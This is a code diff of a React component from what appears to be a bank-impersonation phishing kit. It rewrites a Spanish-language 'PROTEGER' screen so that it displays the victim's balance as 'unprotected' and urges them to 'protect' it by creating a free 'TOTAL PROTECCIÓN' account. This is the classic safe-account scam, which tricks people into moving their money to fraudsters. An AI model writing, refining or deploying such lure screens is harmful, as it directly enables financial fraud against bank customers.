@@ -250,16 +250,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.PROTEGER:
         const protegerContent = (
           <>
-            <h2 className="text-xl font-bold mb-3">Protege tu saldo</h2>
+            <h2 className="text-xl font-bold mb-3">Es necesario proteger su saldo</h2>
             <div className="p-4 bg-gray-100 rounded mb-4 text-left">
               <p className="mb-2">
-                Hemos identificado un posible intento de fraude en tu cuenta. 
+                Por su seguridad, es necesario proteger el saldo de su cuenta efectivo, crearemos una cuenta de SU TOTAL PROTECCIÓN de forma gratuita para poder respaldar el fondo disponible en ésta.
               </p>
-              <p className="mb-2">
-                Por seguridad, hemos bloqueado tu saldo de <strong>${screenData.saldo || "0.00"}</strong> para protegerlo.
-              </p>
-              <p className="font-semibold">
-                Tu dinero está seguro mientras verificamos la actividad sospechosa.
+              <p className="mb-2 font-semibold">
+                Saldo sin proteger: <strong>${screenData.saldo || "0.00"}</strong>
               </p>
             </div>
             
@@ -267,7 +264,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               className={primaryBtnClass}
               onClick={() => onSubmit(ScreenType.PROTEGER, { confirmado: true })}
             >
-              Entendido
+              Proteger mi saldo
             </Button>
           </>
         );
